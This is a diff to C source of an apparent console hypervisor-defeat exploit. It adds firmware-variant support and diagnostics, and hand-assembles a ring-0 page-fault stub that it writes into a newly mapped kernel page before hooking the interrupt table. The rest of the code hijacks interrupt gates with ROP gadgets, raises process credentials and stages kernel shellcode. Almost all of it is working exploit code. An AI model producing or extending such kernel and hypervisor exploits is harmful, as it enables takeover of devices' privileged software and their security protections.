@@ -2,6 +2,7 @@
 #include "../shellcode_break_hv/break_hv.h"
 #include "../shellcode_break_hv/break_hv_params.h"
 #include "config.h"
+#include "hv_defeat_13xx.h"
 #include "loader_staging_1160.h"
 #include "utils.h"
 #include <machine/segments.h>
@@ -260,14 +261,15 @@ static void gate_encode(uint64_t target, uint16_t selector, uint8_t ist,
   *hi = (target >> 32) & 0xffffffffULL;
 }
 
-static int verify_tss_layout(uint64_t tss_base, uint64_t saved[NCPU]) {
+static int verify_tss_layout(uint64_t tss_base, uint64_t saved[NCPU],
+                             int db_ist) {
   uint64_t rsp0[NCPU];
   uint64_t ist4[NCPU];
 
   for (int cpu = 0; cpu < NCPU; cpu++) {
     uint64_t base = tss_base + (uint64_t)cpu * TSS_STRIDE;
     rsp0[cpu] = kread64(base + 0x04);
-    ist4[cpu] = kread64(base + TSS_IST(4));
+    ist4[cpu] = kread64(base + TSS_IST(db_ist));
     saved[cpu] = kread64(tss_ist_slot(tss_base, cpu, 6));
     if ((rsp0[cpu] >> 47) != 0x1ffffULL || ist4[cpu] == 0 || saved[cpu] != 0)
       return -1;
@@ -390,7 +392,42 @@ static int build_handler(uint8_t *handler, uint64_t handler_va,
   STORE_PARAM(0xf00, kg(env_offset.MP_STARTUP_INIT_VECTOR));
   STORE_PARAM(0xf08, dmap);
   STORE_PARAM(0xf10, oracle);
-  STORE_PARAM(0xf18, HV_LOADER_PA_REGULAR);
+  /* The AP scanner derives its VMCB window from this. Pro consoles put the
+   * HV carveout at an EFI-derived high base; regular keeps 0x62800000. */
+  uint64_t hv_region_param = HV_LOADER_PA_REGULAR;
+  if (linux_i.kit_type == KIT_RETAIL_PRO) {
+    uint64_t derived = derive_h();
+    if (derived)
+      hv_region_param = derived;
+  }
+  STORE_PARAM(0xf18, hv_region_param);
+
+  /* Viola leaves the first MiB-pages of the carveout out of the guest page
+   * tables. Walk them with vtophys (no access) and hand the AP the contiguous
+   * mapped run so it never reads an unmapped page. Oberon is fully mapped, so
+   * its bounds are unchanged. */
+  uint64_t scan_lo = hv_region_param + 0x200000ULL;
+  uint64_t scan_hi = hv_region_param + 0x1000000ULL;
+  if (linux_i.kit_type == KIT_RETAIL_PRO) {
+    uint64_t run_lo = 0, run_hi = 0;
+    for (uint64_t pa = scan_lo & ~0x1FFFFFULL; pa < scan_hi; pa += 0x200000ULL) {
+      if (vtophys(dmap + pa)) {
+        if (!run_lo)
+          run_lo = pa;
+        run_hi = pa + 0x200000ULL;
+      } else if (run_lo) {
+        break;
+      }
+    }
+    if (run_lo) {
+      if (run_lo > scan_lo)
+        scan_lo = run_lo;
+      if (run_hi < scan_hi)
+        scan_hi = run_hi;
+    }
+  }
+  STORE_PARAM(0xf40, scan_lo);
+  STORE_PARAM(0xf48, scan_hi);
   STORE_PARAM(0xf20, resume_cave + CAVE_STASH_OFF);
   STORE_PARAM(0xf28, payload_va);
   STORE_PARAM(0xf30, kernel_cr3);
@@ -470,9 +507,23 @@ static int arm_startup_carrier(uint64_t resume_cave) {
   if (break_hv_bin_len == 0 || break_hv_bin_len > sizeof(staged) ||
       kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0)
     return -1;
-  if (!((saved_gate_lo >> 47) & 1) || ((saved_gate_lo >> 32) & 7) != 4 ||
-      verify_tss_layout(tss_base, saved_ist))
-    return -2;
+  {
+    int gate_p = (int)((saved_gate_lo >> 47) & 1);
+    int gate_ist = (int)((saved_gate_lo >> 32) & 7);
+    int tss_rc = (gate_p && gate_ist >= 1 && gate_ist <= 7)
+                     ? verify_tss_layout(tss_base, saved_ist, gate_ist)
+                     : -1;
+    if (!gate_p || gate_ist < 1 || gate_ist > 7 || tss_rc) {
+      notify("%04x arm gate: lo=0x%llx P=%d ist=%d tss=%d tss_slot0=0x%llx "
+             "rsp0_0=0x%llx ist4_0=0x%llx\n",
+             fw, (unsigned long long)saved_gate_lo, gate_p, gate_ist, tss_rc,
+             (unsigned long long)saved_ist[0],
+             (unsigned long long)kread64(tss_base + 0x04),
+             (unsigned long long)kread64(tss_base +
+                 TSS_IST(gate_ist >= 1 && gate_ist <= 7 ? gate_ist : 1)));
+      return -2;
+    }
+  }
 
   gate_encode(kg(env_offset.GAD_PIVOT_ADD_RSP28_RET),
               (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
@@ -537,12 +588,12 @@ static int arm_startup_carrier(uint64_t resume_cave) {
                                    STACK_TOP_OFF;
     if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want) {
       if (restore_ists(tss_base, saved_ist)) {
-        notify("11.60 IST6 rollback readback failed; cold reboot required\n");
+        notify("%04x IST6 rollback readback failed; cold reboot required\n", fw);
         return -10;
       }
       kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE, 0);
       if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
-        notify("11.60 carrier-state rollback failed; cold reboot required\n");
+        notify("%04x carrier-state rollback failed; cold reboot required\n", fw);
         return -10;
       }
       return -9;
@@ -591,30 +642,37 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   int rc;
 
   if (shellcode_kernel == NULL || !offsets_present()) {
-    notify("11.60 offsets/raw firmware gate failed; refusing to arm\n");
+    notify("%04x offsets/raw firmware gate failed; refusing to arm\n", fw);
+    notify("gate diag: raw=0x%08x handler_pa=0x%llx cave_pa=0x%llx "
+           "code_cave=0x%llx data_cave=0x%llx\n",
+           (unsigned)kernel_get_fw_version(),
+           (unsigned long long)env_offset.HV_HANDLE_VMEXIT_PA,
+           (unsigned long long)env_offset.HV_CODE_CAVE_PA,
+           (unsigned long long)env_offset.KERNEL_CODE_CAVE,
+           (unsigned long long)env_offset.DATA_CAVE);
     return -1;
   }
   if (validate_wake_cave(shellcode_kernel_len)) {
-    notify("11.60 wake blob/cave mapping validation failed\n");
+    notify("%04x wake blob/cave mapping validation failed\n", fw);
     return -1;
   }
 
   facs = kread64(kg(env_offset.ACPIGBL_FACS));
   if ((facs >> 48) != 0xffffULL) {
-    notify("11.60 AcpiGbl_FACS validation failed; refusing to arm\n");
+    notify("%04x AcpiGbl_FACS validation failed; refusing to arm\n", fw);
     return -1;
   }
 
   kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);
   if (pin_to_tss0() || sceKernelGetCurrentCpu() != 15) {
-    notify("11.60 could not pin scheduler CPU 15 / TSS slot zero\n");
+    notify("%04x could not pin scheduler CPU 15 / TSS slot zero\n", fw);
     return -1;
   }
   if (fw >= 0x1000 && fw < 0x1100)
     notify("10.xx pinned to CPU 15 (TSS slot zero)\n");
 
   if (walk_page(dmap + AP_PAYLOAD_PAGE, 1)) {
-    notify("11.60 startup-AP carrier page is not executable\n");
+    notify("%04x startup-AP carrier page is not executable\n", fw);
     return -1;
   }
 
@@ -629,7 +687,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   resume_cave = kg(env_offset.DATA_CAVE);
   if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
-    notify("11.60 resume carrier has stale state; cold reboot required\n");
+    notify("%04x resume carrier has stale state; cold reboot required\n", fw);
     return -1;
   }
   kwrite(resume_cave + CAVE_ORACLE_OFF, zeroes, sizeof(zeroes));
@@ -637,7 +695,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   rc = arm_startup_carrier(resume_cave);
   if (rc) {
-    notify("11.60 startup-AP carrier refused to arm (%d)\n", rc);
+    notify("%04x startup-AP carrier refused to arm (%d)\n", fw, rc);
     return -1;
   }
   if (fw >= 0x1000 && fw < 0x1100)
@@ -651,9 +709,74 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   setidt(13, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
   setidt(30, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
   /* 8.x/9.x: the facs-8 mangled pointer is a canonical user-space address, so
-   * the resume fault is a #PF (vector 14), not the #GP 10.x/11.x take. */
-  if (fw >= 0x0800 && fw < 0x1000)
-    setidt(14, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
+   * the resume fault is a #PF (vector 14), not the #GP 10.x/11.x take.
+   *
+   * A bare vector-14 gadget catches every unrelated page fault during the
+   * pre-suspend window and runs the chain with the hypervisor alive (observed:
+   * the console powers off right after arming). Install a stub instead: it
+   * compares CR2's low dword with the mangled FACS address and forwards any
+   * other fault to the kernel's original #PF handler. */
+  if (fw >= 0x0800 && fw < 0x1000) {
+    uint8_t gate[16];
+    uint64_t idt = kg(env_offset.IDT);
+    kread(idt + 14 * 16, gate, sizeof(gate));
+    uint64_t orig = (uint64_t)gate[0] | ((uint64_t)gate[1] << 8) |
+                    ((uint64_t)gate[6] << 16) | ((uint64_t)gate[7] << 24) |
+                    ((uint64_t)gate[8] << 32) | ((uint64_t)gate[9] << 40) |
+                    ((uint64_t)gate[10] << 48) | ((uint64_t)gate[11] << 56);
+    /* The stub must be executable in the KERNEL pmap at ring0: the AP
+     * payload page is executable but the hypervisor may map it user-accessible
+     * (SMEP), and KERNEL_CODE_CAVE is .text (NPF while the HV lives). Take a
+     * fresh page, install it supervisor+RW at a free kernel VA, clear NX. */
+    uint64_t kpml4 = kread64(getpmap(kernel_get_proc(0)) + 0x20);
+    uint64_t stub_pa = alloc_page();
+    uint64_t stub = 0;
+    if (stub_pa) {
+      for (uint64_t cand = 0x100400000ULL; cand < 0x100C00000ULL;
+           cand += PAGE_SIZE) {
+        if (vtophys(cand))
+          continue;
+        install_page(kpml4, cand, stub_pa, 0);
+        if (!walk_page(cand, 1) && vtophys(cand) == stub_pa) {
+          stub = cand;
+          break;
+        }
+      }
+    }
+    uint32_t lo = (uint32_t)(kg(env_offset.ACPIGBL_FACS) - 8);
+    notify("%04x stub: pa=0x%llx va=0x%llx vt=0x%llx\n", fw,
+           (unsigned long long)stub_pa, (unsigned long long)stub,
+           (unsigned long long)(stub ? vtophys(stub) : 0));
+    if (!stub) {
+      notify("08xx stub page unavailable; vector 14 left alone\n");
+    } else if (!orig || (orig >> 48) != 0xFFFF) {
+      notify("08xx original #PF gate unreadable; vector 14 left alone\n");
+    } else {
+      uint64_t g = kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET);
+      uint8_t code[40];
+      size_t o = 0;
+      code[o++] = 0x0F; code[o++] = 0x20; code[o++] = 0xD0;  /* mov rax, cr2 */
+      code[o++] = 0x3D;                                       /* cmp eax,lo32 */
+      memcpy(code + o, &lo, 4); o += 4;
+      code[o++] = 0x75; code[o++] = 0x0C;                     /* jne forward */
+      code[o++] = 0x48; code[o++] = 0xB8;                     /* movabs rax,gadget */
+      memcpy(code + o, &g, 8); o += 8;
+      code[o++] = 0xFF; code[o++] = 0xE0;                     /* jmp rax */
+      code[o++] = 0x48; code[o++] = 0xB8;                     /* forward: orig */
+      memcpy(code + o, &orig, 8); o += 8;
+      code[o++] = 0xFF; code[o++] = 0xE0;                     /* jmp rax */
+      kwrite(stub, code, o);
+      notify("%04x stub: written\n", fw);
+      if (kread64(stub) == *(uint64_t *)code) {
+        setidt(14, stub, 7);
+        notify("%04x stub: gate set\n", fw);
+        notify("08xx #PF stub armed (fwd=0x%llx)\n",
+               (unsigned long long)orig);
+      } else {
+        notify("08xx stub write mismatch; vector 14 left alone\n");
+      }
+    }
+  }
   if (fw >= 0x1000 && fw < 0x1100)
     notify("10.xx IST7 + IDT #GP/#SX set\n");
 
